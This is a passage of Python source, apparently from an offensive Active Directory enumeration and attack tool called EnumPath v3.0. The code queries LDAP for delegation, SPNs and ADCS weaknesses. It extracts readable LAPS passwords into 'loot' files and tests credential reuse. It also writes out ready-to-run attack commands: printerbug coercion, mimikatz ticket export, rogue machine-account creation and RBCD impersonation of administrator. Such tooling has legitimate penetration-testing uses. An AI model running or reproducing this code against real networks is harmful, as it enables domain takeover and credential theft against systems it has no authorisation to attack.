        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo dNSHostName objectClass"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if stdout and 'msDS-AllowedToDelegateTo' in stdout:
            delegation_found = True
            entries = self._parse_ldap_entries(stdout)
            for entry in entries:
                subject = entry.get('sAMAccountName', ['Unknown'])[0]
                targets = entry.get('msDS-AllowedToDelegateTo', [])
                is_computer = 'computer' in entry.get('objectClass', [])
                
                for target in targets:
                    self.results['delegation'].append({
                        'type': 'constrained',
                        'subject': subject,
                        'target_spn': target,
                        'subject_type': 'computer' if is_computer else 'user',
                        'risk': 'high',
                        'attack_vector': 'S4U2Self/S4U2Proxy abuse'
                    })
                    print(f"{Fore.YELLOW}[!] Constrained delegation: {subject} -> {target}{Style.RESET_ALL}")
        
        # 3. Resource-Based Constrained Delegation (RBCD)
        print(f"{Fore.CYAN}[*] Checking for resource-based constrained delegation...{Style.RESET_ALL}")
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity dNSHostName"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if stdout and 'msDS-AllowedToActOnBehalfOfOtherIdentity' in stdout:
            delegation_found = True
            entries = self._parse_ldap_entries(stdout)
            for entry in entries:
                target = entry.get('sAMAccountName', ['Unknown'])[0]
                hostname = entry.get('dNSHostName', ['Unknown'])[0]
                
                self.results['delegation'].append({
                    'type': 'rbcd',
                    'target': target,
                    'hostname': hostname,
                    'risk': 'high',
                    'attack_vector': 'Create machine account and abuse RBCD'
                })
                print(f"{Fore.YELLOW}[!] RBCD configured on {target} ({hostname}){Style.RESET_ALL}")
        
        # 4. Check for delegation-related attack paths
        if delegation_found:
            self._generate_delegation_attacks()
        else:
            print(f"{Fore.GREEN}[+] No delegation vulnerabilities found{Style.RESET_ALL}")
    
    def _parse_ldap_entries(self, ldap_output):
        """Parse LDAP search output into structured entries"""
        entries = []
        current_entry = {}
        
        for line in ldap_output.split('\n'):
            line = line.strip()
            
            if line.startswith('dn:'):
                # Start of new entry
                if current_entry:
                    entries.append(current_entry)
                current_entry = {}
            elif ':' in line and not line.startswith('#'):
                # Attribute line
                attr, value = line.split(':', 1)
                attr = attr.strip()
                value = value.strip()
                
                if attr not in current_entry:
                    current_entry[attr] = []
                current_entry[attr].append(value)
        
        # Add last entry
        if current_entry:
            entries.append(current_entry)
        
        return entries
    
    def _generate_delegation_attacks(self):
        """Generate specific attack commands for found delegation issues"""
        attacks_file = f"{self.parent.output_dir}/commands/delegation_attacks.txt"
        
        with open(attacks_file, 'w') as f:
            f.write("# Delegation Attack Commands\n")
            f.write("# Generated by EnumPath v3.0\n\n")
            
            for delegation in self.results['delegation']:
                if delegation['type'] == 'unconstrained':
                    f.write(f"# Unconstrained Delegation Attack on {delegation['target']}\n")
                    f.write(f"# 1. Force authentication to capture TGT\n")
                    f.write(f"python3 printerbug.py {self.parent.domain}/{self.parent.username}:{self.parent.password}@{self.parent.target} {delegation.get('hostname', delegation['target'])}\n")
                    f.write(f"# 2. Extract tickets from compromised host\n")
                    f.write(f"mimikatz 'privilege::debug' 'sekurlsa::tickets /export'\n\n")
                
                elif delegation['type'] == 'constrained':
                    f.write(f"# Constrained Delegation Attack: {delegation['subject']} -> {delegation['target_spn']}\n")
                    f.write(f"# Requires compromising {delegation['subject']}\n")
                    f.write(f"impacket-getST -spn {delegation['target_spn']} -impersonate administrator {self.parent.domain}/{delegation['subject']}:password\n\n")
                
                elif delegation['type'] == 'rbcd':
                    f.write(f"# RBCD Attack on {delegation['target']}\n")
                    f.write(f"# 1. Create machine account (if quota allows)\n")
                    f.write(f"impacket-addcomputer {self.parent.domain}/{self.parent.username}:{self.parent.password} -dc-ip {self.parent.target} -computer-name 'FAKE01$' -computer-pass 'Password123!'\n")
                    f.write(f"# 2. Modify msDS-AllowedToActOnBehalfOfOtherIdentity\n")
                    f.write(f"rbcd.py -delegate-from 'FAKE01$' -delegate-to '{delegation['target']}' {self.parent.domain}/{self.parent.username}:{self.parent.password}\n")
                    f.write(f"# 3. Get TGT and perform S4U2Self/S4U2Proxy\n")
                    f.write(f"impacket-getST -spn cifs/{delegation.get('hostname', delegation['target'])} -impersonate administrator {self.parent.domain}/FAKE01$:Password123!\n\n")
        
        print(f"{Fore.GREEN}[+] Delegation attack commands saved to {attacks_file}{Style.RESET_ALL}")
            
    def enum_acls(self):
        """Enumerate dangerous ACLs and permissions"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Enumerating dangerous ACLs and permissions...{Style.RESET_ALL}")
        
        domain_dn = f"dc={self.parent.domain.replace('.', ',dc=')}" if self.parent.domain and self.parent.domain.strip() else ""
        
        # 1. Find AdminSDHolder protected users
        print(f"{Fore.CYAN}[*] Checking AdminSDHolder protected users...{Style.RESET_ALL}")
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=user)(adminCount=1))' sAMAccountName adminCount"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if stdout and 'sAMAccountName' in stdout:
            entries = self._parse_ldap_entries(stdout)
            for entry in entries:
                user = entry.get('sAMAccountName', ['Unknown'])[0]
                print(f"{Fore.YELLOW}[+] AdminSDHolder protected user: {user}{Style.RESET_ALL}")
                
                self.results['privilege_escalation'].append({
                    'type': 'admin_count',
                    'target': user,
                    'description': 'User protected by AdminSDHolder - potential high privilege'
                })
        
        # 2. Find users with DCSync permissions (dangerous rights)
        print(f"{Fore.CYAN}[*] Checking for DCSync permissions...{Style.RESET_ALL}")
        # Note: This requires more complex ACL parsing, simplified version
        dcsync_rights = [
            'DS-Replication-Get-Changes',
            'DS-Replication-Get-Changes-All',
            'DS-Replication-Get-Changes-In-Filtered-Set'
        ]
        
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=user)' sAMAccountName memberOf"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        # Look for users in high-privilege groups that likely have DCSync
        dangerous_groups = [
            'Domain Admins', 'Enterprise Admins', 'Administrators',
            'Backup Operators', 'Server Operators', 'Print Operators'
        ]
        
        if stdout:
            entries = self._parse_ldap_entries(stdout)
            for entry in entries:
                user = entry.get('sAMAccountName', ['Unknown'])[0]
                groups = entry.get('memberOf', [])
                
                for group_dn in groups:
                    for dangerous_group in dangerous_groups:
                        if dangerous_group.lower() in group_dn.lower():
                            print(f"{Fore.RED}[!] High-privilege user: {user} in {dangerous_group}{Style.RESET_ALL}")
                            
                            self.results['privilege_escalation'].append({
                                'type': 'high_privilege_group',
                                'user': user,
                                'group': dangerous_group,
                                'risk': 'critical' if dangerous_group in ['Domain Admins', 'Enterprise Admins'] else 'high'
                            })
        
        # 3. Check for users with SPN (potential Kerberoast targets)
        print(f"{Fore.CYAN}[*] Checking for users with SPNs (Kerberoast targets)...{Style.RESET_ALL}")
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if stdout and 'servicePrincipalName' in stdout:
            entries = self._parse_ldap_entries(stdout)
            spn_users = []
            
            for entry in entries:
                user = entry.get('sAMAccountName', ['Unknown'])[0]
                spns = entry.get('servicePrincipalName', [])
                
                for spn in spns:
                    spn_users.append({'user': user, 'spn': spn})
                    
                    # Categorize SPN by service type
                    service_type = spn.split('/')[0] if '/' in spn else spn
                    risk_level = self._assess_spn_risk(service_type)
                    
                    if risk_level == 'high':
                        print(f"{Fore.RED}[!] HIGH-VALUE SPN: {user} - {spn}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}[+] SPN found: {user} - {spn}{Style.RESET_ALL}")
            
            if spn_users:
                self.results['kerberos']['spn_users'] = spn_users
        
        # 4. Look for computers with unconstrained delegation (different from user enum)
        print(f"{Fore.CYAN}[*] Checking for delegation-enabled computers...{Style.RESET_ALL}")
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName dNSHostName"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if stdout and 'sAMAccountName' in stdout:
            entries = self._parse_ldap_entries(stdout)
            for entry in entries:
                computer = entry.get('sAMAccountName', ['Unknown'])[0]
                hostname = entry.get('dNSHostName', ['Unknown'])[0]
                
                # Skip domain controllers (expected to have delegation)
                if not any(dc_indicator in computer.lower() for dc_indicator in ['dc', 'domain', 'controller']):
                    print(f"{Fore.RED}[!] Non-DC with unconstrained delegation: {computer} ({hostname}){Style.RESET_ALL}")
                    
                    self.results['delegation'].append({
                        'type': 'unconstrained_computer',
                        'target': computer,
                        'hostname': hostname,
                        'risk': 'critical'
                    })
        
        # 5. Check for LAPS passwords we can read
        print(f"{Fore.CYAN}[*] Checking LAPS password access...{Style.RESET_ALL}")
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=computer)' sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        laps_readable = 0
        if stdout:
            # Count actual password values (not just the attribute)
            laps_readable = len(re.findall(r'ms-Mcs-AdmPwd:\s*\S+', stdout))
            
            if laps_readable > 0:
                print(f"{Fore.RED}[!] Can read {laps_readable} LAPS passwords!{Style.RESET_ALL}")
                self.results['vulnerabilities'].append(f"Can read {laps_readable} LAPS passwords")
                
                # Extract and save LAPS passwords
                self._extract_laps_passwords(stdout)
            else:
                print(f"{Fore.GREEN}[+] No LAPS passwords accessible with current privileges{Style.RESET_ALL}")
    
    def _assess_spn_risk(self, service_type):
        """Assess risk level of SPN based on service type"""
        high_value_services = [
            'MSSQLSvc', 'HTTP', 'TERMSRV', 'RestrictedKrbHost',
            'HOST', 'WSMAN', 'FTP', 'IMAP', 'POP', 'SMTP'
        ]
        
        return 'high' if service_type in high_value_services else 'medium'
    
    def _extract_laps_passwords(self, ldap_output):
        """Extract and save readable LAPS passwords"""
        laps_file = f"{self.parent.output_dir}/loot/credentials/laps_passwords.txt"
        
        entries = self._parse_ldap_entries(ldap_output)
        laps_creds = []
        
        for entry in entries:
            computer = entry.get('sAMAccountName', ['Unknown'])[0]
            password = entry.get('ms-Mcs-AdmPwd', [None])[0]
            expiration = entry.get('ms-Mcs-AdmPwdExpirationTime', ['Unknown'])[0]
            
            if password:
                laps_creds.append({
                    'computer': computer,
                    'password': password,
                    'expiration': expiration
                })
                print(f"{Fore.RED}[!] LAPS password for {computer}: {password[:8]}...{Style.RESET_ALL}")
        
        if laps_creds:
            with open(laps_file, 'w') as f:
                f.write("# LAPS Passwords\n")
                f.write("# Format: Computer:Password:Expiration\n\n")
                for cred in laps_creds:
                    f.write(f"{cred['computer']}:{cred['password']}:{cred['expiration']}\n")
            
            print(f"{Fore.GREEN}[+] LAPS passwords saved to {laps_file}{Style.RESET_ALL}")
            self.results['credentials'].extend(laps_creds)
    
    def enum_laps(self):
        """LAPS enumeration"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Checking LAPS configuration...{Style.RESET_ALL}")
        
        domain_dn = f"dc={self.parent.domain.replace('.', ',dc=')}" if self.parent.domain and self.parent.domain.strip() else ""
        
        # Check for LAPS attributes
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=computer)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if 'ms-Mcs-AdmPwd' in stdout:
            computers_with_laps = stdout.count('ms-Mcs-AdmPwd')
            print(f"{Fore.GREEN}[+] LAPS enabled on {computers_with_laps} computers{Style.RESET_ALL}")
            
            # Check if we can read LAPS passwords
            readable_passwords = stdout.count('ms-Mcs-AdmPwd:')
            if readable_passwords > 0:
                print(f"{Fore.RED}[!] Can read {readable_passwords} LAPS passwords!{Style.RESET_ALL}")
                self.results['vulnerabilities'].append(f"Can read {readable_passwords} LAPS passwords")


class KerberosAdvanced:
    """Extended Kerberos attacks"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
    
    def targeted_kerberoast(self):
        """Smart Kerberoasting with prioritization"""
        if not self.parent.username or 88 not in self.parent.results['services']:
            return
            
        print(f"\n{Fore.YELLOW}[*] Advanced Kerberoasting...{Style.RESET_ALL}")
        
        domain = self.parent.domain or self.parent.target
        
        # Get detailed SPN information
        cmd = f"impacket-GetUserSPNs '{domain}/{self.parent.username}:{self.parent.password}' -dc-ip {self.parent.target} -outputfile {self.parent.output_dir}/loot/kerberoast_detailed.txt"
        stdout, _, returncode = self.parent.run_command(cmd, timeout=60)
        
        if returncode == 0:
            # Analyze SPN types for prioritization
            high_value_spns = ['MSSQLSvc', 'HTTP', 'TERMSRV', 'RestrictedKrbHost']
            
            if os.path.exists(f"{self.parent.output_dir}/loot/kerberoast_detailed.txt"):
                with open(f"{self.parent.output_dir}/loot/kerberoast_detailed.txt", 'r') as f:
                    content = f.read()
                    
                for spn_type in high_value_spns:
                    if spn_type in content:
                        print(f"{Fore.RED}[!] High-value SPN found: {spn_type}{Style.RESET_ALL}")
                        self.results['kerberos']['high_value_spns'] = self.results['kerberos'].get('high_value_spns', [])
                        self.results['kerberos']['high_value_spns'].append(spn_type)
    
    def asreproast_enhanced(self):
        """Enhanced AS-REP roasting"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Enhanced AS-REP roasting...{Style.RESET_ALL}")
        
        domain = self.parent.domain or self.parent.target
        
        # Check for computer accounts without pre-auth
        cmd = f"impacket-GetNPUsers '{domain}/' -no-preauth -dc-ip {self.parent.target} -outputfile {self.parent.output_dir}/loot/asrep_computers.txt"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if os.path.exists(f"{self.parent.output_dir}/loot/asrep_computers.txt"):
            with open(f"{self.parent.output_dir}/loot/asrep_computers.txt", 'r') as f:
                content = f.read()
                if '$krb5asrep$' in content:
                    computer_count = content.count('$krb5asrep$')
                    print(f"{Fore.RED}[!] Found {computer_count} computer accounts without pre-auth!{Style.RESET_ALL}")
    
    def delegation_abuse(self):
        """Generate delegation attack commands"""
        if not self.results['delegation']:
            return
            
        print(f"\n{Fore.YELLOW}[*] Generating delegation attack commands...{Style.RESET_ALL}")
        
        commands = []
        
        for delegation in self.results['delegation']:
            if delegation['type'] == 'unconstrained':
                cmd = f"# Unconstrained delegation attack on {delegation['target']}"
                cmd += f"\n# 1. Coerce authentication: python3 printerbug.py {self.parent.domain}/{self.parent.username}:{self.parent.password}@{self.parent.target} {delegation['target']}"
                cmd += f"\n# 2. Extract tickets: mimikatz 'privilege::debug' 'sekurlsa::tickets /export'"
                commands.append(cmd)
        
        if commands:
            with open(f"{self.parent.output_dir}/commands/delegation_attacks.txt", 'w') as f:
                f.write('\n\n'.join(commands))
            print(f"{Fore.GREEN}[+] Delegation attack commands saved{Style.RESET_ALL}")


class ADCSEnum:
    """Certificate Services enumeration"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
    
    def enum_cert_templates(self):
        """Find vulnerable certificate templates"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Enumerating ADCS certificate templates...{Style.RESET_ALL}")
        
        # Use Certify.exe or certipy for comprehensive enumeration
        cmd = f"certipy find -u '{self.parent.username}@{self.parent.domain}' -p '{self.parent.password}' -target {self.parent.target} -text -stdout"
        stdout, _, returncode = self.parent.run_command(cmd, timeout=60)
        
        if returncode == 0 and stdout:
            self.results['adcs']['templates_found'] = True
            
            # Check for common vulnerabilities
            esc_patterns = {
                'ESC1': 'enrolleeSuppliesSubject.*TRUE',
                'ESC2': 'Any Purpose',
                'ESC3': 'Certificate Request Agent',
                'ESC4': 'WRITE_OWNER|WRITE_DACL',
                'ESC6': 'EDITF_ATTRIBUTESUBJECTALTNAME2',
                'ESC8': 'HTTP.*NTLM'
            }
            
            for esc, pattern in esc_patterns.items():
                if re.search(pattern, stdout, re.IGNORECASE):
                    self.results['adcs'][esc] = True
                    self.results['vulnerabilities'].append(f"ADCS {esc} vulnerability")
                    print(f"{Fore.RED}[!] ADCS {esc} vulnerability detected!{Style.RESET_ALL}")
        
        # Save full output
        if stdout:
            with open(f"{self.parent.output_dir}/loot/adcs_enum.txt", 'w') as f:
                f.write(stdout)
    
    def enum_ca_config(self):
        """Enumerate CA configuration"""
        print(f"\n{Fore.YELLOW}[*] Checking CA configuration...{Style.RESET_ALL}")
        
        # Check for web enrollment
        web_ports = [80, 443]
        for port in web_ports:
            if self.parent.check_port(port):
                cmd = f"curl -k -s https://{self.parent.target}/certsrv/ | grep -i 'certificate'"
                stdout, _, _ = self.parent.run_command(cmd, timeout=10)
                
                if 'certificate' in stdout.lower():
                    print(f"{Fore.YELLOW}[+] Web enrollment may be available on port {port}{Style.RESET_ALL}")
                    self.results['adcs']['web_enrollment'] = port


class CoercionEnum:
    """Authentication coercion vectors"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
    
    def enum_coercion_methods(self):
        """Test various coercion methods"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Testing authentication coercion methods...{Style.RESET_ALL}")
        
        coercion_methods = {
            'PrinterBug': 'python3 printerbug.py',
            'PetitPotam': 'python3 petitpotam.py',
            'DFSCoerce': 'python3 dfscoerce.py',
            'ShadowCoerce': 'python3 shadowcoerce.py'
        }
        
        for method, tool in coercion_methods.items():
            # Test if the method is available (check for RPC endpoints)
            cmd = f"rpcdump.py '{self.parent.username}:{self.parent.password}@{self.parent.target}' | grep -E 'MS-RPRN|MS-EFSRPC|MS-DFSNM|MS-FSRVP'"
            stdout, _, _ = self.parent.run_command(cmd, timeout=15)
            
            if stdout:
                endpoints = stdout.strip().split('\n')
                for endpoint in endpoints:
                    if 'MS-RPRN' in endpoint and method == 'PrinterBug':
                        self.results['coercion_vectors'].append(method)
                        print(f"{Fore.GREEN}[+] {method} available (Print System Remote Protocol){Style.RESET_ALL}")
                    elif 'MS-EFSRPC' in endpoint and method == 'PetitPotam':
                        self.results['coercion_vectors'].append(method)
                        print(f"{Fore.GREEN}[+] {method} available (Encrypting File System Remote Protocol){Style.RESET_ALL}")
    
    def check_signing_requirements(self):
        """Check SMB/LDAP signing for relay attacks"""
        print(f"\n{Fore.YELLOW}[*] Checking signing requirements for relay attacks...{Style.RESET_ALL}")
        
        # SMB signing already checked in main SMB enum
        smb_signing = any('SMB Signing disabled' in vuln for vuln in self.results['vulnerabilities'])
        
        if smb_signing:
            print(f"{Fore.RED}[!] SMB relay attacks possible{Style.RESET_ALL}")
            self.results['attack_paths'].append("SMB relay via coercion")
        
        # Check LDAP signing
        if 389 in self.parent.results['services']:
            cmd = f"nmap -p389 --script ldap-rootdse {self.parent.target} -Pn"
            stdout, _, _ = self.parent.run_command(cmd, timeout=15)
            
            if 'supportedLDAPVersion' in stdout:
                print(f"{Fore.YELLOW}[+] LDAP server detected - check for channel binding{Style.RESET_ALL}")


class PrivEscEnum:
    """Local and domain privilege escalation"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
    
    def enum_machine_quota(self):
        """Check machine account quota for RBCD attacks"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Checking machine account quota...{Style.RESET_ALL}")
        
        domain_dn = f"dc={self.parent.domain.replace('.', ',dc=')}" if self.parent.domain and self.parent.domain.strip() else ""
        
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=domain)' ms-DS-MachineAccountQuota"
        stdout, _, _ = self.parent.run_command(cmd, timeout=15)
        
        if 'ms-DS-MachineAccountQuota' in stdout:
            quota_match = re.search(r'ms-DS-MachineAccountQuota:\s*(\d+)', stdout)
            if quota_match:
                quota = int(quota_match.group(1))
                self.results['privilege_escalation'].append({
                    'type': 'machine_quota',
                    'value': quota,
                    'exploitable': quota > 0
                })
                
                if quota > 0:
                    print(f"{Fore.YELLOW}[+] Machine account quota: {quota} (RBCD attacks possible){Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] Machine account quota: {quota} (restricted){Style.RESET_ALL}")
    
    def enum_gpo_abuse(self):
        """Find GPO modification opportunities"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Checking for GPO abuse opportunities...{Style.RESET_ALL}")
        
        # This would require more complex LDAP queries in a real implementation
        # For now, we'll do basic GPO enumeration
        cmd = ['crackmapexec', 'smb', self.parent.target, '-u', self.parent.username, '-p', self.parent.password, '--groups']
        stdout, _, _ = self.parent.run_command(cmd, timeout=15)
        
        if 'Group Policy Creator Owners' in stdout:
            print(f"{Fore.RED}[!] User is in 'Group Policy Creator Owners' - GPO abuse possible{Style.RESET_ALL}")
            self.results['privilege_escalation'].append({
                'type': 'gpo_creator',
                'risk': 'high'
            })


class CredentialManager:
    """Secure credential management"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
        self.discovered_creds = []
    
    def store_discovered_creds(self, username, password, hash_ntlm=None, source='enumeration'):
        """Store discovered credentials securely"""
        cred_entry = {
            'username': username,
            'password': password,
            'hash_ntlm': hash_ntlm,
            'source': source,
            'timestamp': datetime.now().isoformat()
        }
        
        self.discovered_creds.append(cred_entry)
        
        # Save to file
        creds_file = f"{self.parent.output_dir}/loot/credentials/discovered_credentials.json"
        with open(creds_file, 'w') as f:
            json.dump(self.discovered_creds, f, indent=2)
    
    def test_credential_reuse(self):
        """Test discovered credentials across services"""
        if not self.discovered_creds:
            return
            
        print(f"\n{Fore.YELLOW}[*] Testing credential reuse...{Style.RESET_ALL}")
        
        for cred in self.discovered_creds:
            if cred['password']:  # Skip hash-only entries for now
                # Test SMB
                if 445 in self.parent.results['services']:
                    cmd = f"crackmapexec smb {self.parent.target} -u '{cred['username']}' -p '{cred['password']}'"
                    stdout, _, returncode = self.parent.run_command(cmd, timeout=10)
                    
                    if returncode == 0 and '[+]' in stdout:
                        print(f"{Fore.GREEN}[+] Credential reuse: {cred['username']} works on SMB{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description='EnumPath v3.0 - Advanced Windows Domain Enumeration Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python3 enumpath.py -t 10.10.10.100
  
  # With credentials
  python3 enumpath.py -t 10.10.10.100 -u administrator -p Password123
  
  # Deep enumeration (slower but more thorough)
  python3 enumpath.py -t 10.10.10.100 -u john -p Password123 --deep
  
  # Advanced v3.0 features - specific modules
  python3 enumpath.py -t 10.10.10.100 -u john -p Password123 --modules adcs,delegation,coercion
  
  # Aggressive attack mode with auto-exploitation
  python3 enumpath.py -t 10.10.10.100 -u john -p Password123 --attack-mode aggressive --auto-exploit
  
  # All modules with comprehensive output
  python3 enumpath.py -t 10.10.10.100 -u john -p Password123 --modules all --output-format all
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-d', '--domain', help='Domain name')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output directory')
    parser.add_argument('--timeout', type=int, default=15, help='Command timeout (default: 15s)')
    parser.add_argument('--deep', action='store_true', help='Deep enumeration (slower)')
    
    # v3.0 Enhanced Arguments
    parser.add_argument('--modules', type=str, default='all', 
                       help='Comma-separated modules: all,smb,ldap,kerberos,adcs,coercion,privesc (default: all)')
    parser.add_argument('--attack-mode', choices=['standard', 'aggressive', 'stealth'], 
                       default='standard', help='Attack mode intensity (default: standard)')
    parser.add_argument('--auto-exploit', action='store_true', 
                       help='Automatically attempt exploitation of discovered vulnerabilities')
    parser.add_argument('--output-format', choices=['standard', 'json', 'xml', 'all'], 
                       default='standard', help='Output format (default: standard)')
    parser.add_argument('--max-depth', type=int, default=3, 
                       help='Maximum recursion depth for SMB enumeration (default: 3)')
    parser.add_argument('--threads', type=int, default=5, 
                       help='Number of concurrent threads (default: 5)')
    parser.add_argument('--delay', type=float, default=0, 
                       help='Delay between requests in seconds for stealth (default: 0)')
    parser.add_argument('--resume', type=str, 
                       help='Resume from previous scan output directory')
    parser.add_argument('--bloodhound-collection', action='store_true', 
                       help='Force BloodHound collection even without --deep')
    parser.add_argument('--no-bruteforce', action='store_true', 
                       help='Skip password spraying and bruteforce attempts')
    
    args = parser.parse_args()
    
    if args.username and not args.password:
        import getpass
        args.password = getpass.getpass("Password: ")
    
    # Process modules argument
    if args.modules:
        modules = [m.strip() for m in args.modules.split(',')]
    else:
        modules = ['all']
    
    # Check for resume functionality
    if args.resume:
        if not os.path.exists(args.resume):
            print(f"{Fore.RED}[!] Resume directory does not exist: {args.resume}{Style.RESET_ALL}")
            sys.exit(1)
        print(f"{Fore.YELLOW}[*] Resuming from: {args.resume}{Style.RESET_ALL}")
    
    try:
        enum = EnumPath(
            target=args.target,
            username=args.username,
            password=args.password,
            domain=args.domain,
            verbose=args.verbose,
            output_dir=args.output or args.resume,
            timeout=args.timeout,
            deep=args.deep or args.bloodhound_collection,
            modules=modules,
            attack_mode=args.attack_mode,
            auto_exploit=args.auto_exploit
        )
        
        # Display v3.0 configuration
        if args.verbose:
            print(f"{Fore.CYAN}[*] EnumPath v3.0 Configuration:{Style.RESET_ALL}")
            print(f"    Modules: {', '.join(modules)}")
            print(f"    Attack Mode: {args.attack_mode}")
            print(f"    Auto-Exploit: {args.auto_exploit}")
            print(f"    Max Depth: {args.max_depth}")
            print(f"    Threads: {args.threads}")
            if args.delay > 0:
                print(f"    Stealth Delay: {args.delay}s")
        
        enum.run()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
